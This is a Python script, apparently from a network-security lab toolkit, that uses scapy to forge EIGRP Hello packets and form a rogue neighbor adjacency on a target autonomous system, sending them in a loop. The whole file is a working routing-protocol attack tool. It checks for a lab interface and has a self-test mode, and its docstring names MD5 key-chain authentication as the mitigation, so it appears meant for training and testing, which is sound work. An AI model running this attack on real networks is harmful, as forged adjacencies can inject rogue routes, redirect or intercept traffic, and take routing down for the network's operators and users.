#!/usr/bin/env python3
"""FHRP/ROUTING: send EIGRP Hello packets attempting a rogue neighbor
relationship on the target AS. Mitigation: EIGRP MD5 authentication (key
chain) — see README."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, iface_mac  # noqa: E402


def build_hello(scapy_all, asn, router_id, src):
    import scapy.contrib.eigrp as eigrp
    Ether, IP = scapy_all.Ether, scapy_all.IP
    pkt = eigrp.EIGRP(opcode=5, asn=asn, tlvlist=[eigrp.EIGRPParam(k1=1, k3=1, holdtime=15)])
    # Pin the L2 source to the lab NIC's real MAC. This already forwarded (the
    # IP-multicast dst let scapy route-resolve a source), but that source was the
    # container's default-route iface (eth0) — route-dependent. Setting it
    # explicitly guarantees a valid, deterministic eth1 source that the PNetLab
    # link bridge forwards. See common.iface_mac().
    return Ether(src=src, dst="01:00:5e:00:00:0a") / IP(dst="224.0.0.10", proto=88, src=router_id) / pkt


def main():
    p = base_parser("EIGRP rogue adjacency: send forged Hello packets")
    p.add_argument("--asn", type=int, default=100)
    p.add_argument("--router_id", default="9.9.9.9")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    src = iface_mac(args.iface)
    pkt = build_hello(scapy_all, args.asn, args.router_id, src)
    if args.selftest:
        selftest_ok("eigrp_rogue", "EIGRP Hello len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_hello(scapy_all, args.asn, args.router_id, src), iface=args.iface, verbose=0)
        status("SENT", "EIGRP Hello #%d asn=%d router-id=%s" % (n + 1, args.asn, args.router_id))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

